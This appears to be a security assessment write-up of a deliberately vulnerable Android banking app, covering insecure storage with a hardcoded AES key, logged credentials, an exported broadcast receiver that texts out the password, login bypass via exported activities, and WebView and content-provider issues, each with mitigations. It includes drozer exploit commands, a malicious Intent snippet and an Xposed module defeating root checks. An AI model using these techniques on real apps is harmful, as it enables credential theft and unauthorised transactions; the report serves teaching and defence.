

##  Sensitive data in SharedPreferences
#### Description
SharedPreferences are stored in `/data/data/<package name>/shared_prefs/<filename.xml>`[1]. It's a simple XML file, thus everyone with root access (be it a user via adb or a random app), can read the content of the XML. The app encrypts the data in it, but based on CryptoClass, we're able to decrypt it again.

According to AndroBugs the SharedPrefs might be even `MODE_WORLD_READABLE`, which would enable the attack to work on not rooted devices as well. I didn't really check it, but according to the file permissions, it looked like that claim by AndroBugs might be wrong or misleading.

#### Recon
I investigated via `adb shell` the data directory of the app in order to find some starting points / hints for possible vulnerarbilities. When I found that the username and password seem to be encrypted, I took a look at the code base to understand *how* they are encrypted.

#### Exploit
Manually grab secrets stored in the SharedPreferences:
```
<string name="superSecurePassword">rkIFfKfP7Wo2DfVc74fi7Q==</string>
<string name="EncryptedUsername">c3RldmU=</string>
```	
I tried to decrypt it based on the information I found in `CryptoClass.java`:
The username is simply Base64 encoded and decoding it yields: `steve`

The password is encrypted using `CryptClass.aesEncryptedString()`. Which uses AES Encryption, followed by Base64 encoding. 

However, the used cypher as well as needed keys and input vectors are hardcoded in the class's source code, which allows us to decrypt it.
```
byte[] ivBytes = new byte[]{(byte) 0, (byte) 0, (byte) 0, (byte) 0, (byte) 0, (byte) 0, (byte) 0, (byte) 0, (byte) 0, (byte) 0, (byte) 0, (byte) 0, (byte) 0, (byte) 0, (byte) 0, (byte) 0};
String key = "This is the super secret key 123";
```

Decoding the Base64 output and decrypting the AES result based on the known Key and IV, should yield `sTV@123` as the user's password.

#### Mitigation
Don't run your own crypto. Don't rely on Base64 only (as with the username, although that's not yet too senisitive). Don't hardcode keys and IVs in the code. Probably you should not share keys + IVs for every user (or alternatively salt the result) to avoid rainbow table based attacks.

## 2. Login credentials are logged
#### Description
The app is logging the username and password that are being used to login.

#### Recon
Using command `adb logcat` , I could see the logs.

#### Exploit
Since the attacker can remotely access the logs as they are unprotected, he can easily log into the app impersonating to be an actual user which injures the security goal of confidentiality.

#### Mitigation
The developer should make sure that the library does not send sensitive information to log output. 
One common solution is for an application to declare and use a custom log class, so that log output is automatically turned on/off based on Debug/Release.

## 3. Retrieve password via broadcast
#### Description
The app registeres a broadcast receiver `com.android.tumbank.MyBroadCastReceiver` which is exported. It accepts a phonenumber and a new password and then sends out a sms containing  the old and new password.
I can use this to retrieve the current password of the user.

#### Recon
Exploring the decompiled code.

#### Exploit
I can send a broadcast with our phone number and a random new password (as it won't be stored to the settings in the receiver). 
The broadcast receiver will then send a sms to our phone number with the current password of the user.

An example exploit might eg be:

`dz> run app.broadcast.send  --action com.android.tumbank.theBroadcast --extra string phonenumber "0152 123456789" --extra string newpass notused`

Of course this can be used by malicious apps as well, like the following:
```
Intent i = new Intent();
i.setAction("com.android.tumbank.theBroadcast");
i.putStringExtra("phonenumber", "0152 123456789");
i.putStringExtra("action", "notused");
this.sendBroadcast(i);
```


#### Mitigation
Change the architecture of how the user is notified about a password change. There should not be an exported broadcast receiver which simply shouts out the decrypted password.

## 4. No Prevention of tapjacking
#### Description
The app's activities and views don't make use of `setfilterTouchesWhenObscured(true)` or `android:filterTouchesWhenObsured`.

#### Recon
Searched for usage of the method name.

#### Exploit
An attacker could create an overlay on top of the bank's app which hides certain information like eg. the real recipient of a transaction. 
This might be used to send money to the attacker.

#### Mitigation
Add `setfilterTouchesWhenObscured(true)` or `android:filterTouchesWhenObsured` to the views.

## 5. Access Control Issues
#### Description
The app contains some activities that are exported which means that they can be started from other apps on the system.

#### Recon
I can analyse the Android Manifest file using jadx and see that the intent filter can be invoked by external application since `android:exported=true` is present.

#### Exploit
Using the drozer command - 
```
dz> run app.activity.start --component com.android.tumbank com.android.tumbank.DoTransfer
```
I can open this activity without being actually logged into the app and can do money transfers/transactions without the knowledge of the user.

This way it's also possible to completely bypass the login:
`dz> run app.activity.start --component com.android.tumbank com.android.tumbank.PostLogin`

#### Mitigation
In Android Manifest file, `android:exported=false` must be present. Furthermore the session should be handled and stored properly and every activity should check the session on it's `onStart`.

## 6. Webview Javascript Vulnerability
#### Description
Since javascript is enabled, this vulnerability can be used to allow JavaScript to control the host application.

#### Recon
Using jadx, I can see the code of the `ViewStatement` class.
```
WebView mWebView = (WebView) findViewById(R.id.webView1);
mWebView.getSettings().setJavaScriptEnabled(true);
```
#### Exploit
A function in the remote js file can use the injected object to access the getClass() method. After that the attacker can use reflections to call any Java method.

#### Mitigation 
`setJavascriptInterface` should be set to false.


## 7 Content Provider Vulnerability
### Description
Content providers are exposed and its possible to query them using drozer

## Recon
```
Using drozer
un provider.finduri com.android.tumbank
Scanning com.android.tumbank...
content://com.google.android.gms.games
content://com.android.tumbank.TrackUserContentProvider
content://com.android.tumbank.TrackUserContentProvider/
content://com.android.tumbank.TrackUserContentProvider/trackerusers/
content://com.google.android.gms.games/
content://com.android.tumbank.TrackUserContentProvider/trackerusers
```
### Mitigation

Providing the android permissions and using android signature protection mechanism in android manifest.

## Bonus: Hide root
#### Description
The app checks whether the phone is rooted with two custom methods: `doesSuperuserApkExist("/system/app/Superuser.apk")` and `doesSUexist()` in PostLogin.Class


The first checks whether the superuser.apk file is present on the filesystem. The second checks whether `/system/bin/su` is available in the PATH.

````
private boolean doesSuperuserApkExist(String paramString)
  {
    return Boolean.valueOf(new File("/system/app/Superuser.apk").exists()).booleanValue() == true;
  }
 ```` 

````
private boolean doesSUexist()
  {
    Object localObject3 = null;
    Object localObject1 = null;
    try
    {
      localProcess = Runtime.getRuntime().exec(new String[] { "/system/bin/which", "su" });
      localObject1 = localProcess;
      localObject3 = localProcess;
      String str = new BufferedReader(new InputStreamReader(localProcess.getInputStream())).readLine();
      return str != null;
    }
    catch (Throwable localThrowable)
    {
      Process localProcess;
      if (localObject1 != null) {
        ((Process)localObject1).destroy();
      }
      return false;
    }
    finally
    {
      if (localThrowable != null) {
        localThrowable.destroy();
      }
    }
  }
  ````
On the simulator Xposed framework[3] is installed (and it could be installed by anybody who's interested in doing that). 
This allows us to write a custom Xposed Module which hooks into the two custom methods and simply returns `false` - a feature provided by `XposedHelpers.findAndHookMethod`.

#### Exploit
An example Xposed module might look like the following:
```
package com.tumbankexploit.;

import android.graphics.Color;
import android.widget.TextView;
import de.robv.android.xposed.IXposedHookLoadPackage;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedBridge;
import de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;
import static de.robv.android.xposed.XposedHelpers.findAndHookMethod;

public class XposedHook implements IXposedHookLoadPackage {
    public void handleLoadPackage(final LoadPackageParam lpparam) throws Throwable {
        if (!lpparam.packageName.equals("com.android.tumbank"))
            return;

        findAndHookMethod("com.android.tumbank.PostLogin", lpparam.classLoader, "doesSuperuserApkExist", new XC_MethodHook() {
            @Override
            protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                return false;
            }
        });
        
        findAndHookMethod("com.android.tumbank.PostLogin", lpparam.classLoader, "doesSUexist", new XC_MethodHook() {
            @Override
            protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                return false;
            }
        });
    }
}
```
The module needs to be packaged correspondingly and installed via the Xposed Installer app.

#### Mitigation
The apps developer needs to assume that the user is able to run Xposed and thus manipulate the implemented root-checks. 
It's recommended to use Android SafetyNet[3] to do those checks (although SafetyNet's root check can be manipulated too as far as I know).

## List of references
- [1] https://developer.android.com/reference/android/content/SharedPreferences
- [2] https://developer.android.com/guide/topics/data/data-storage
- [3] https://binderfilter.github.io/xposed/
- [4] https://developer.android.com/training/safetynet/

